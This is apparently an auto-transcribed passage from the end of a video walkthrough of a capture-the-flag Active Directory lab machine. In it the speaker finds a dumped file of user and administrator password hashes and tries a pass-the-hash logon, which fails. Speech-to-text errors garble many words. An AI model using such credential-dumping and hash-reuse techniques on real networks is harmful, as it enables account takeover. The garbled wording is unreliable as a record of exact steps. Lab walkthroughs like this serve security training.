system32 if we do cackles on file dot txt we can see users can read this and if we look at it we have the output of looks like hash dump or maybe a DC sink but this definitely will stick some powershell script with the formatting but we can see the hashes for all the users and the administrator hash so if we copy this and not only enough sizzler is not around get ad user wonder if we can find sizzler if he was created after giant july 11th will know why he doesn't exist in this output but we do PS don't my exact administrator at sizzle dough needs to be that local - hash is this it'll work attempted logon is invalid so maybe the administrator password changed but the one to do Kerberos thing maybe not mr kly let's go back to this window so that didn't work paste so yeah we could have done use this to get the hash for this so the output of this is definitely I don't know what this is actually I'm going to stop guessing but that is the Box it looks like it ad user isn't really working through the shell and I'm getting tired so hope you guys enjoyed the video take care and I will see you all next time